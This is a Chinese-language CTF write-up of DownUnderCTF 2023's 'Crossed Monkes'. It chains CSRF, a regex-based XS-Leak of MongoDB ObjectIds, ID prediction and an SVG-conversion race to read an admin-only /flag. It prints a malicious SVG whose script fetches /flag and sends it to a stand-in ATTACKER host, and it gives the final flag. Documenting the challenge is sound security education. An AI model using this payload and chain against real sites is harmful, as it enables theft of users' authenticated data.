# DownUnderCTF 2023 Crossed Monkes Writeup

## 题目简述

目标是一个带管理员机器人的图片分享站。管理员可以上传 SVG，但服务端会先把 SVG 保存到磁盘和 MongoDB，再用 CairoSVG 转成 PNG，最后删除原始 SVG 并标记记录为已发布。上传接口没有 CSRF 防护，而按文件 ID 读取的路由没有检查 `published` 状态。

利用链需要把 CSRF、XS-Leak、MongoDB ObjectId 预测和 SVG 转换竞态组合起来：先泄露一个 ObjectId，预测恶意 SVG 的 ID，再在转换完成前让管理员打开原始 SVG，以同源脚本读取 `/flag`。

## 解题过程

管理员机器人访问攻击者页面前会登录站点，并自动点击页面中的按钮。上传表单没有 CSRF token，因此攻击者页面可以用 `DataTransfer` 构造文件并代管理员提交跨站 `multipart/form-data` 表单。

第一步先上传一个无害图片到固定的 24 位十六进制 `share_key`。发布后，数据库会把该记录的 `search_id` 设置为自身 ObjectId。目录查看接口支持用户控制的 MongoDB 正则：

```python
{'search_id': {'$regex': search}}
```

同时，`?redirect_to=True` 在匹配时返回到真实图片的重定向，不匹配时返回 404。攻击者依次创建 `<img>`，测试如下前缀正则：

```text
^a[a-f0-9]*$
^b[a-f0-9]*$
...
```

匹配分支最终加载有效图片并触发 `onload`，错误分支触发 `onerror`，由此逐位泄露完整的 24 个十六进制字符。这不是读取响应正文，而是利用可观察的图片加载结果形成 XS-Leak。

MongoDB ObjectId 的布局为：

```text
8 hex 时间戳 | 10 hex 进程随机值 | 6 hex 计数器
```

同一进程短时间生成的 ID 会保留中间 10 位，并递增末尾计数器。用首个 ID 可以为下一次 SVG 上传枚举少量相邻时间戳和计数器候选。

第二次 CSRF 上传一个很大的 SVG。文件中加入大量 `<polygon>` 延长 `svg2png()` 的处理时间，并嵌入脚本：

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <!-- 重复大量 polygon 以扩大竞态窗口 -->
  <script>
    fetch('/flag')
      .then(response => response.text())
      .then(data => {
        location = 'https://ATTACKER/?data=' + encodeURIComponent(btoa(data));
      });
  </script>
</svg>
```

竞态窗口来自上传函数的顺序：

1. `save_entry()` 已把 `.svg` 写入磁盘并插入 `published=False` 的记录；
2. `convert_svg2png()` 仍在解析大文件；
3. 转换完成后才删除 SVG、更新文件名并执行 `publish_entry()`。

目录搜索会过滤未发布记录，不能直接发现恶意文件；但 `/view/<share_key>/<file_id>` 只按 `_id` 和 `share_key` 查询，没有验证 `published`。攻击页面并发尝试预测出的 ID，一旦某个 `<img>` 成功加载，就把管理员标签页导航到对应 SVG。SVG 从目标站点同源执行，管理员 Cookie 随 `fetch('/flag')` 发送，响应随后被编码并外传。

官方利用拆成四个页面：无害上传、ObjectId XS-Leak、恶意 SVG 上传、候选 ID 竞态探测。由于进程随机值和进程 ID 在实际部署中保持时间较长，也可以分两次机器人请求完成非预期的简化链。最终 flag 为：

```text
DUCTF{tH3_m0Nk3S_aR3_n0w_m3g4_XroSS}
```

仓库中的猴子背景 GIF 仅用于页面装饰，没有承载漏洞证据，因此未复制到 WP 资源目录。

## 方法总结

这道题的每个单点问题都不足以直接拿到 flag。CSRF 提供管理员身份下的上传，XS-Leak 暴露预测起点，ObjectId 结构缩小未知 ID 空间，而未检查 `published` 的读取路由把 SVG 转换前的瞬时文件暴露出来。分析异步“上传后消毒”设计时，必须核对文件落盘、数据库可见、消毒完成和下载授权四个时刻是否一致。
